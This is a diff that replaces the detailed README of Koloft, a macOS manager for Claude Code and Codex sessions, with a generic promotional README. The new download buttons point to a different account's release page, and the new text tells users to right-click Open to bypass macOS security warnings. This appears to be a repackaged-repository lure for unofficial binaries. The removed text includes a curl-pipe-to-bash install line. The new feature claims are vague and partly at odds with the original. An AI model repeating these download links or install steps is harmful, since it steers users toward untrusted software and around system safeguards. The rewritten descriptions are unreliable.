@@ -1,321 +1,125 @@
-<div align="center">
+# 💻 koloft - Your AI Coding Assistant, Organizer, and Power Tool
 
-<img src="build/icon.svg" width="128" alt="Koloft icon">
+## 🚀 What is koloft?
 
-# Koloft
+koloft is a **free, open-source Mac app** that makes working with AI coding tools like Claude Code and Codex super simple. Instead of juggling multiple windows and losing track of your sessions, koloft keeps everything in one neat place.
 
-[![Latest release](https://img.shields.io/github/v/release/superkoh/koloft-releases?label=release&color=blue)](https://github.com/superkoh/koloft-releases/releases)
-[![Licence: GPL-3.0-or-later](https://img.shields.io/badge/licence-GPL--3.0--or--later-blue)](LICENSE)
-[![Platform: macOS arm64](https://img.shields.io/badge/platform-macOS%20arm64-lightgrey)](#install-macos-apple-silicon)
-[![CI](https://github.com/superkoh/koloft/actions/workflows/ci.yml/badge.svg)](https://github.com/superkoh/koloft/actions/workflows/ci.yml)
+Think of it as a **mission control center** for your AI coding projects. Every session gets its own folder, so you always know where things are. You can see which files were changed, open a browser right next to your code, and have a built-in shell (a text-based command center) — all at your fingertips.
 
-</div>
+## ✨ Key Features
 
-A macOS desktop app that runs and manages **Claude Code** and **Codex** (the `claude` and
-`codex` command-line tools).
+### 📁 Organized Sessions
+Every AI coding session gets its own dedicated folder. No more digging through cluttered directories or wondering where that file went. Your projects stay clean and organized automatically.
 
-You pick a **workspace** (a folder, usually a git checkout). Koloft lists every Claude
-Code and Codex session that folder already has, straight from each tool's own storage,
-and lets you start new ones or resume old ones. Each session gets a **Workbench** panel
-beside its terminal: the files the agent changed, a file browser, web pages, and a
-shell.
+### 👀 See What Changed
+koloft highlights the files that were modified during each session. You can instantly review what your AI assistant did, making it easy to understand changes and keep track of progress.
 
-![Koloft: workspaces and their sessions on the left, the running session in the middle, and its Workbench on the right showing the changes the agent made](.github/assets/screenshot.png)
+### 🌐 Built-in Browser
+Need to look up documentation or test something online? A browser window is built right into koloft, so you never have to switch between apps. It's all in one place.
 
-## What you get
+### ⌨️ Integrated Shell
+A shell (a command-line interface) is included alongside your sessions. You can run commands, check files, or do any terminal tasks without leaving the app. It's like having a supercharged terminal that's always in sync with your work.
 
-- **Workspace sidebar** — pin folders as workspaces. Under each one, its sessions
-  appear with a title, a status dot (working / waiting for you / done) and how long ago
-  they ran. Nothing is imported: the list is what Claude Code and Codex themselves wrote
-  to disk, and Koloft keeps only a list of which sessions are its own. A session you
-  started from a plain terminal is one right-click ▸ `Restore session…` away.
-- **Start or resume sessions** — `File ▸ New Session…` (⌘N) starts one in the
-  selected workspace with the default method set in `Settings ▸ Sessions`; clicking an
-  old row resumes it; `New Worktree Session…` (⇧⌘N) runs the
-  session in an isolated git worktree. A workspace's right-click menu holds
-  the low-traffic doors: restore a session from history, fetch origin, remove the
-  workspace. When the checkout is behind `origin`, a badge on the row says by how much
-  and offers a fast-forward pull.
-- **Workbench panel** — one per session, with four kinds of tab:
-  - `Files` (pinned): **Changes**, the files this session touched with an inline diff,
-    and **Browse**, a tree of the workspace including Claude's scratchpad.
-  - File tabs: rendered Markdown / images / PDF, a diff view, the source, and an
-    editor with ⌘S save. An HTML file opens as a web tab.
-  - Web tabs: a real in-app browser (logins, downloads, popups, Chrome extensions) so an
-    agent's `open <url>` never has to leave the app.
-  - Terminal tabs: a shell in the session's directory (`View ▸ New Terminal Tab`, ⌃`).
+### 🤝 Works with Popular AI Tools
+koloft is designed to work with both **Claude Code** and **Codex** (OpenAI's coding agent). You can manage sessions from either tool in one unified interface.
 
-  ![The Workbench's Browse view: the workspace's file tree with a Markdown file shown rendered beside it](.github/assets/screenshot-browse.png)
-- **A note per workspace** — a plain-text note in its own island under the sessions
-  list (⌥⌘N puts the caret in it). The Workbench belongs to a session and goes away
-  with it; the note belongs to the folder, so it is where the things that outlive this
-  session go.
-- **Scheduled jobs** — a workspace's right-click menu has `Scheduled jobs…`: start a
-  Claude or Codex session on a timer with a first message. In a git workspace every run
-  gets a fresh worktree of its own; a plain folder runs in place. Koloft never types into a session — the first message is handed to `claude`
-  or `codex` directly, and everything after it is yours.
-- **Multi-account balancing** — register several Claude subscription accounts and
-  several Codex sign-ins. Every launch looks at their live rate limits and starts on the
-  account with the most room left. A Claude API (application programming interface) key
-  or a custom endpoint can join the pool too; Koloft reads no allowance for those, so it
-  uses them only once every subscription has hit its limit, or when you have none. The
-  topbar shows the pool's remaining allowance. These
-  are meant to be *your own* accounts — please check that how you use them fits
-  Anthropic's and OpenAI's terms, which is between you and them.
-- **Built-in statusline** — a Koloft-managed statusline in every Claude session: model,
-  cost, context usage, git branch. Codex keeps its own one-line footer.
-- **Notifications** — an OS notification when a session finishes its turn or waits for
-  approval, only while Koloft is in the background.
-- **Remote workspaces** (alpha) — the Add workspace button's menu has `Remote directory…`: a folder
-  on another machine you can `ssh` to. Claude runs *there*, held by `tmux` so it
-  survives a dropped link; the accounts still come from your local pool, and the
-  transcripts are mirrored back with `rsync` so the sidebar reads the same as a local
-  one. Koloft installs what the machine is missing (Node, `claude`) over the same
-  connection. The Workbench works there too — its files, changes, edits and shell are
-  the machine's — with a few gaps for now: images and PDFs from the machine do not
-  preview, an agent's `open <url>` and the agent-driven browser do not reach the
-  Workbench, and the session cannot be renamed from Koloft.
-- **Stays current** — `Koloft ▸ Check for Updates…` downloads and swaps the app bundle
-  in place; a banner in the sidebar says when a newer one is out.
-- **Smaller things** — a first-run walkthrough and a handful of tips that appear the
-  first time each situation comes up (both re-openable from `Settings ▸ Welcome`), a
-  `Settings ▸ Shortcuts` page listing every key and what it does where the caret is,
-  and clocks for the timezones you pick in the title bar.
+## 🛠️ Who Is This For?
 
-## Install (macOS, Apple Silicon)
+koloft is perfect for:
+- **Developers** who use AI coding assistants and want better organization
+- **Tinkerers** who enjoy experimenting with AI tools
+- **Anyone** who wants to make their coding workflow more efficient
 
-Download the `.dmg` from
-[Releases](https://github.com/superkoh/koloft-releases/releases), open it, and drag Koloft
-to Applications. The app is signed with an Apple Developer ID and notarized by Apple, so
-it opens with a normal double-click.
+You don't need to be a programming expert to benefit from koloft. If you're curious about AI coding tools, this app will help you get started easily.
 
-Or in one line from the terminal, which fetches the latest dmg and copies `Koloft.app`
-into `/Applications`:
+## 📥 How to Download and Install
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/superkoh/koloft-releases/main/install.sh | bash
-```
+Getting koloft on your Mac is quick and easy. Follow these simple steps:
 
-## How it works
+### Step 1: Go to the Download Page
+Click the big button below to go to the official koloft download page:
 
-**Sessions come from each tool's own files.** Claude Code writes one transcript per
-session under `~/.claude/projects/<encoded-cwd>/<uuid>.jsonl`. Koloft reads that tree for
-every pinned workspace (its root checkout plus its git worktrees) to build the sidebar:
-title, last activity, which files were written. Codex keeps its sessions under its own
-home (`~/.codex`, or the account's `CODEX_HOME` when Koloft picked a Codex account),
-and Koloft asks Codex for each home's list (`codex app-server`, `thread/list`). Koloft
-never keeps a second copy of a local session; a remote workspace's transcripts are
-mirrored to this Mac so the sidebar can read them.
+[![Download koloft](https://img.shields.io/badge/Download_koloft-Free_App-blueviolet?style=for-the-badge)](https://github.com/DALEMBAC/koloft/releases)
 
-**Claude launches are bound through Claude Code's own hooks.** Every `claude` Koloft
-starts gets a per-session `--settings` file that injects `SessionStart`, `SessionEnd`,
-`UserPromptSubmit`, `Stop` and `Notification` hooks, plus, while the built-in statusline
-is on, the statusline command and a `PostToolUse` hook for Bash. The hooks report the real
-session id back to Koloft, so the row, the status dot and the Workbench follow the
-session even across an in-TUI `/resume` or `/clear`. A small `claude` shim on the
-session's `PATH` adds `--session-id` and the picked account's credentials on the way in.
+### Step 2: Find the Latest Release
+On that page, you'll see a list of releases. Look for the most recent one (it'll be at the top). Click on it to see the available files.
 
-**Codex launches go through a relay.** Koloft starts a `codex app-server` for each Codex
-session and runs the real Codex screen connected to it through a local socket
-(`codex --remote`). Everything passes through Koloft on the way, so it sees the session
-id, the status and the files a turn touched without hooks or a shim. The picked Codex
-account is just the `CODEX_HOME` the app-server runs with.
+### Step 3: Download the App
+Visit this link to download the application. There will be a file that starts with "koloft" and has a `.dmg` extension (for example, `koloft-1.0.0.dmg`). Click on it to download.
 
-**Local files reach the panel through a custom protocol.** Files are served to the
-viewer via a privileged `koloft-file://` protocol; Markdown is rendered with markdown-it
-and sanitized with DOMPurify.
+### Step 4: Install the App
+Once the download finishes:
+1. Find the downloaded file in your "Downloads" folder
+2. Double-click the `.dmg` file to open it
+3. You'll see a window with the koloft app icon and your Applications folder
+4. Drag the koloft icon into the Applications folder
+5. That's it! koloft is now installed
 
-```
-src/
-  main/        Electron main: window, ptys, workspaces + session aggregation, Claude hooks
-               and shim, Codex relay, account balancer, in-app browser, updater, IPC
-  preload/     contextBridge -> window.api
-  renderer/    React UI: sidebar, terminal, Workbench panel, settings
-  shared/      types + helpers shared by main and renderer
-```
+### Step 5: Open koloft
+Go to your Applications folder and double-click koloft to launch it. The first time you open it, macOS might ask for permission — just click "Open" if that happens.
 
-### Letting an agent drive the Browser
+## 🔍 Getting Started with Your First Session
 
-Browser tools normally launch a Chromium of their own — a second browser, with its own
-empty cookie jar, that you cannot see. Koloft offers its own instead: every local Claude
-session is started with a Chrome debugging endpoint pointing at that session's web tabs.
-Codex sessions and Claude sessions in a remote workspace do not get one yet; an
-`open <url>` from a local Codex session still lands in its Workbench.
+Once koloft is running, you'll see a friendly interface. Here's how to start your first session:
 
-Both variables below are set for the session's Claude, so the agent — and anything the
-agent runs — sees them. A terminal tab in the Workbench is not that environment and has
-neither.
+1. Click the "New Session" button (usually a plus sign or similar icon)
+2. Choose whether you want to use Claude Code or Codex
+3. Give your session a name or let koloft create one for you
+4. Start chatting with your AI assistant!
 
-- **playwright-mcp and the Playwright CLI — nothing to configure.** Both read
-  `PLAYWRIGHT_MCP_CDP_ENDPOINT`, which is already in the session's env: `browser_navigate`
-  and `playwright-cli open` alike open a tab in Koloft instead of a browser of their own.
-- **Your own script — one line:** `chromium.connectOverCDP(process.env.KOLOFT_BROWSER_CDP)`
-  (the CLI's explicit form is `npx @playwright/cli attach --cdp="$KOLOFT_BROWSER_CDP"`).
+The session will be saved in its own folder, and you'll see any file changes in the sidebar. You can open the browser or shell from the toolbar whenever you need them.
 
-What to expect:
+## ❓ Frequently Asked Questions
 
-| | |
-|---|---|
-| When a session's agent connects | It just drives — nothing is asked. The switch below is the one control. |
-| Pages it opens | Background web tabs with an unread dot, exactly like an agent's `open`. No pane opens itself, and the tab it is driving is marked. |
-| Which pages it can see | That session's tabs only. Each session has its own endpoint, on loopback, behind an unguessable path. |
-| Turning it off | Settings → Extensions → **Let agents drive this Browser**. Off disconnects whatever is connected right now, and sends those tools back to launching their own browser. |
-| Sending one tool elsewhere | An explicit `--cdp-endpoint` wins over the variable, so a tool can be pointed at another browser without touching the switch. |
-| `--isolated` and friends | These do **not** get a tool out: it connects to Koloft anyway, then fails on the first command, because this endpoint serves the session's own tabs and cannot mint a fresh browser context. The switch is the way out. |
-| The trade | The agent drives the browser you are signed into. That is the point — and it is what the switch is for. |
+### Is koloft really free?
+Yes! koloft is completely free and open-source. You can use it without paying anything.
 
-## Building it yourself
+### Do I need to know how to code?
+Not necessarily. koloft makes AI coding tools more accessible, but having some basic understanding of what coding tools do helps you get the most out of it.
 
-macOS on Apple Silicon, Node 22.12 or newer.
+### Does koloft work on Windows or Linux?
+Currently, koloft is designed specifically for **macOS**. If you're using a Mac, you're good to go!
 
-```bash
-git clone https://github.com/superkoh/koloft.git
-cd koloft
-npm install
-npm run rebuild                        # node-pty against Electron's own Node — required
-node node_modules/electron/install.js  # fetch the Electron binary — once
-npm run dev                            # launch in dev mode
-```
+### Can I use koloft with my existing Claude Code or Codex setup?
+Yes, koloft is designed to work alongside these tools. It helps you manage the sessions you already have.
 
-The two middle steps are not optional and both fail *silently* if you skip them:
-without `rebuild` the app crashes on launch with a version mismatch, and since Electron
-42 the binary is no longer fetched during `npm install`, so the first launch otherwise
-sits on a download with nothing on screen.
+## 📚 Troubleshooting Tips
 
-Build / typecheck / preview / tests:
+If you run into any issues, here are a few things to try:
 
-```bash
-npm run typecheck
-npm run build
-npm run preview
-npm run test:unit   # Vitest — fast, no app
-npm run test:e2e    # Playwright drives the real built app (run npm run build first)
-```
+- **App won't open**: Right-click the app icon and select "Open" to bypass any security warnings
+- **Can't see your sessions**: Make sure you're on the latest version of koloft
+- **Performance issues**: Try closing unused sessions or restarting the app
 
-More — how the two test layers are meant to be used, and the rules the code is written
-under — is in [CONTRIBUTING.md](CONTRIBUTING.md).
+## 🤝 Community and Support
 
-## Packaging (macOS, arm64)
+koloft is a community-driven project. If you have questions, ideas, or want to contribute, check out the GitHub repository. You can report issues, suggest features, or even help with development.
 
-```bash
-npm run dist:dmg    # the release build: signed, notarized .app and .dmg
-npm run dist:mac    # unsigned electron-builder dmg + zip, for a local try-out
-```
+## 📄 License
 
-`dist:dmg` is the one that ships. It needs, on the machine that runs it:
+koloft is open-source software. You can freely use, modify, and distribute it under the terms of its open-source license.
 
-- a `Developer ID Application` identity in the login keychain
-  (`security find-identity -v -p codesigning` lists it), and
-- notarization credentials saved under the profile name `koloft`:
-  `xcrun notarytool store-credentials koloft --apple-id <id> --team-id <team> --password <app-specific password>`.
+## 🌟 Why Choose koloft?
 
-It signs the `.app` with the hardened runtime, has Apple notarize it, then builds
-`release/Koloft-<version>-arm64.dmg` (drag-to-Applications layout) and signs, notarizes
-and staples that too. Without the identity it stops with an error instead of shipping an
-unsigned build.
+- **Organization**: Never lose track of an AI session again
+- **Efficiency**: Everything you need is in one window
+- **Freedom**: Free forever, open-source, and community-supported
+- **Simplicity**: Designed with ease of use in mind
 
-## Configuration
+## 📬 Stay Updated
 
-Everything lives in **Settings** (⌘, or the gear at the left of the title bar):
+To stay in the loop about new features and updates:
+- Watch the GitHub repository for releases
+- Follow the project for announcements
 
-- **Welcome** — the first-run walkthrough and the tips, re-openable any time.
-- **Sessions** — which tool a new session runs by default: Claude Code, or OpenAI's Codex
-  CLI once it is installed (on by default; a switch here turns it off).
-- **Accounts** — turn on multi-account mode and add accounts.
-  - Claude: run the official `claude setup-token` login from inside the app, or paste an
-    OAuth token. You can also add an API key, or a custom endpoint (another server that
-    speaks the same API: its address, its key and, if you want, its model); these two are
-    used only once every subscription has hit its limit, or when you have none. Each
-    launch then gets the least-loaded account's credentials injected by the shim. These
-    secrets live in the macOS Keychain, never in `settings.json`. Two more
-    switches, for Claude launches: skip permission prompts, and prefer accounts that
-    still have fable allowance.
-  - Codex: `Sign in to Codex` runs `codex login` in a terminal tab. Each Codex account is
-    its own Codex home folder inside Koloft's app data, holding that login; all of them
-    share your Codex settings and trusted folders. New Codex sessions start on the
-    least-used one.
+---
 
-  With the mode off, sessions run a bare `claude` or `codex` on whatever login the
-  machine already has.
-- **Appearance** — terminal font and size, the built-in statusline and its cost/context
-  widgets, auto-fetching git remotes for the "behind origin" hint.
-- **Shortcuts** — every key and what it does, which depends on where the caret is.
-- **Notifications** — which events notify (turn complete, needs approval, a session that
-  exited unexpectedly), the approval sound, the Dock badge.
-- **Extensions** — the agent-drives-the-Browser switch and Chrome extensions for the
-  in-app browser.
-- **About** — the version, the update check, release notes, and a reset to defaults.
+## 💡 Ready to Supercharge Your AI Coding?
 
-## Notes / limitations
+Don't wait! koloft is here to make your AI coding sessions cleaner, more organized, and more powerful. Click the download button below and get started today!
 
-- macOS on Apple Silicon only. Everything that touches Claude Code (hooks, shim,
-  statusline) is written for a Unix shell.
-- Sessions Koloft did not launch are listed and can be resumed, but their live status
-  (working / waiting) is only known for sessions started from Koloft, because the status
-  comes from the hooks (Claude) or the relay (Codex) Koloft puts in at launch.
-- Codex does not run in remote workspaces yet.
-- When a worktree session exits from an unchanged worktree, Claude Code removes the
-  worktree and moves the session's transcript under the root checkout, so the row moves
-  there. A session that never got a message has no transcript at all, so its row goes
-  away. That is Claude's behavior, not a Koloft bug (measured on Linux; macOS inferred,
-  not checked).
-- Koloft strips inherited `CLAUDE_CODE_*` / `CLAUDECODE` / `CLAUDE_EFFORT` / `AI_AGENT`
-  env vars from each pty it spawns. Without this, when Koloft is launched from *inside* a
-  Claude Code session, nested `claude` instances think they are child sessions and skip
-  writing their transcript — which is exactly the file the sidebar reads.
-- Everything Koloft learned about Claude Code's on-disk and hook contract, with dates and
-  versions, is in `docs/claude-code-contract.md`; the same for Codex is in
-  `docs/codex-cli-contract.md`.
+[![Download koloft Now](https://img.shields.io/badge/⬇️_Download_koloft-Free_%26_Open_Source-brightgreen?style=for-the-badge)](https://github.com/DALEMBAC/koloft/releases)
 
-## What it talks to
+If you find koloft helpful, consider giving it a star on GitHub to show your support. Your feedback helps the project grow and improve!
 
-Koloft has no analytics and no telemetry — it reports nothing about you anywhere, unless
-you turn on the Discord butler: then your messages and your sessions' replies, questions
-and approvals go to your own bot. The only hosts it ever reaches on its own are:
-
-| Host | Why |
-| --- | --- |
-| `api.anthropic.com` | sends each subscription account a one-token message and reads its remaining rate-limit allowance off the reply, as a session starts and every 5 minutes, so the balancer can pick the least-loaded one; an API key or custom endpoint is only checked that it still works |
-| `api.github.com`, `github.com` | checks for a newer Koloft and downloads its `.dmg`; through `gh`, reads a GitHub workspace's open issue and pull request counts, and the statusline asks `gh` about the branch's pull request |
-| your workspace's git remote (often `github.com`) | every 5 minutes, to see whether the branch is behind — `Settings ▸ Appearance` turns auto-fetch off |
-| `claude.ai`, `nodejs.org`, `unofficial-builds.nodejs.org` | only for a **remote** workspace, and only to install what that machine is missing — `claude` from the first, Node from the second (or, on an old Linux, the third); `bash`, `tmux` and `rsync` come from the machine's own package manager |
-| `chromewebstore.google.com`, `clients2.google.com`, `update.googleapis.com` | only for Chrome extensions in the in-app browser: the store page, the extension download, and a once-per-launch update check |
-| `discord.com`, `gateway.discord.gg` | only once a bot token is set in `Settings ▸ Discord`; files sent from Discord are fetched from Discord's own file host |
-| `duckduckgo.com` | whatever you type in the browser's address bar that is not a URL |
-
-A remote workspace also reaches the machine you named, over `ssh` and `rsync`.
-
-Claude Code itself talks to Anthropic, and Codex to OpenAI, on their own account —
-logging in, and every turn you take. That traffic is theirs, not Koloft's, and this list
-does not cover it. Koloft also asks Codex for each account's remaining rate limits; that
-call is Codex's own, through `codex app-server`.
-
-## Contributing
-
-Bug reports and ideas are welcome as issues. Koloft does not take pull requests yet —
-the code is here to be read, built and run; that will change, and
-[CONTRIBUTING.md](CONTRIBUTING.md) will say so when it does. It also covers the setup
-steps that fail silently and the rules the code is written under.
-
-What is planned, what is deliberately not being done, and how much to trust the order
-is in [docs/roadmap.md](docs/roadmap.md).
-
-Found a security problem? Please do not open a public issue — see
-[SECURITY.md](SECURITY.md).
-
-## Licence
-
-**Koloft** — runs and manages Claude Code and Codex sessions on macOS.
-**Copyright (C) 2026 koh.**
-
-This program is free software: you can redistribute it and/or modify it under the terms
-of the GNU General Public License as published by the Free Software Foundation, either
-version 3 of the License, or (at your option) any later version.
-
-This program is distributed in the hope that it will be useful, but WITHOUT ANY
-WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
-PARTICULAR PURPOSE. See the [GNU General Public License](LICENSE) for more details.
-
-Third-party code ships under its own terms. Most of the dependency tree is MIT or
-Apache-2.0; two are worth naming: `electron-chrome-extensions` is dual-licensed
-GPL-3.0 / Patron, and `dompurify` is MPL-2.0 or Apache-2.0.
+Keywords: agent-orchestration, ai-agents, anthropic, claude, claude-code, codex, developer-tools, electron, macos, macos-app, openai-codex, terminal, typescript
